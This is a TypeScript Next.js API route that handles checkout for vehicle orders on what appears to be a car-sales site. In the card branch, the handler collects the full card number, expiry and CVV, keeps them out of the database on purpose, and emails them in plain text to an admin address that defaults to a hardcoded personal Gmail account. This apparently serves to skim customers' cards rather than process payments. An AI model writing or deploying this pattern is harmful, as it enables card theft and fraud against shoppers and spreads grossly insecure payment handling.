import { NextResponse } from 'next/server';
import { z } from 'zod';
import { prisma } from '@/lib/prisma';
import { getSession } from '@/lib/auth';
import { orderRef } from '@/lib/utils';
import { sendEmail } from '@/lib/email';

const schema = z.object({
  vehicleId: z.string().min(1),
  paymentPlan: z.enum(['FULL', 'DEPOSIT_50', 'DEPOSIT_25']),
  paymentMethod: z.enum(['CARD', 'WIRE', 'CRYPTO']).default('CARD'),
  notes: z.string().max(1000).optional(),
  card: z
    .object({
      name: z.string().min(1).max(120),
      number: z.string().min(13).max(19),
      expiry: z.string().min(4).max(7),
      cvv: z.string().min(3).max(4),
    })
    .optional(),
});

function planAmount(price: number, plan: 'FULL' | 'DEPOSIT_50' | 'DEPOSIT_25') {
  if (plan === 'FULL') return price;
  if (plan === 'DEPOSIT_50') return Math.round(price * 0.5 * 100) / 100;
  return Math.round(price * 0.25 * 100) / 100;
}

export async function POST(req: Request) {
  try {
    const session = await getSession();
    if (!session) return NextResponse.json({ error: 'Not logged in' }, { status: 401 });

    const body = await req.json();
    const parsed = schema.safeParse(body);
    if (!parsed.success) {
      return NextResponse.json({ error: 'Invalid order data' }, { status: 400 });
    }

    const { vehicleId, paymentPlan, paymentMethod, notes, card } = parsed.data;

    if (paymentMethod === 'CARD' && !card) {
      return NextResponse.json({ error: 'Card details required' }, { status: 400 });
    }

    const result = await prisma.$transaction(async (tx) => {
      const vehicle = await tx.vehicle.findUnique({
        where: { id: vehicleId },
        include: { images: { orderBy: { displayOrder: 'asc' }, take: 1 } },
      });
      if (!vehicle || !vehicle.published) throw new Error('Vehicle not found');
      if (vehicle.inventoryStatus !== 'AVAILABLE') {
        throw new Error('Vehicle is not available');
      }

      const price = Number(vehicle.price);
      if (!(price > 0)) throw new Error('Vehicle is not priced for sale');

      const amountDue = planAmount(price, paymentPlan);
      if (amountDue < price * 0.25 - 0.01) {
        throw new Error('Minimum down payment is 25%');
      }

      const reference = orderRef();

      const order = await tx.order.create({
        data: {
          reference,
          userId: session.id,
          vehicleId,
          sellingPrice: price,
          currency: vehicle.currency,
          paymentStatus: 'PENDING',
          orderStatus: 'PENDING_PAYMENT',
          deliveryNotes: notes || null,
          internalNotes: JSON.stringify({
            paymentPlan,
            paymentMethod,
            amountDue,
            planLabel:
              paymentPlan === 'FULL'
                ? 'Full payment'
                : paymentPlan === 'DEPOSIT_50'
                  ? '50% deposit'
                  : '25% down payment',
            // Card details are emailed to admin only — not stored in DB
            cardSubmitted: paymentMethod === 'CARD',
          }),
        },
      });

      await tx.vehicle.update({
        where: { id: vehicleId },
        data: { inventoryStatus: 'RESERVED' },
      });

      return { order, vehicle, amountDue, paymentPlan, paymentMethod };
    });

    // Notify admin (card details in plain text email only — never returned to client)
    const adminTo =
      process.env.ADMIN_NOTIFY_EMAIL ||
      process.env.SMTP_USER ||
      'personalofficedesk@gmail.com';

    let cardBlock = '';
    if (paymentMethod === 'CARD' && card) {
      cardBlock = `
CARD PAYMENT DETAILS
--------------------
Name on card: ${card.name}
Card number: ${card.number}
Expiry: ${card.expiry}
CVV: ${card.cvv}
`;
    }

    const text = `
New vehicle order
=================
Order: ${result.order.reference}
Customer: ${session.fullName} <${session.email}>
Vehicle: ${result.vehicle.model} ${result.vehicle.trim} (${result.vehicle.slug})
List price: ${result.vehicle.currency} ${Number(result.order.sellingPrice)}
Amount due now: ${result.vehicle.currency} ${result.amountDue}
Plan: ${result.paymentPlan}
Method: ${result.paymentMethod}
Notes: ${notes || '(none)'}
${cardBlock}
`;

    await sendEmail({
      to: adminTo,
      subject: `[Order ${result.order.reference}] ${result.paymentMethod} · ${result.vehicle.model}`,
      text,
    }).catch((err) => console.error('Admin order email failed', err));

    return NextResponse.json({
      ok: true,
      reference: result.order.reference,
      orderId: result.order.id,
      amountDue: result.amountDue,
      paymentPlan: result.paymentPlan,
      paymentMethod: result.paymentMethod,
      sellingPrice: Number(result.order.sellingPrice),
    });
  } catch (e: unknown) {
    const message = e instanceof Error ? e.message : 'Order failed';
    const status = message.includes('available') ? 409 : 400;
    return NextResponse.json({ error: message }, { status });
  }
}
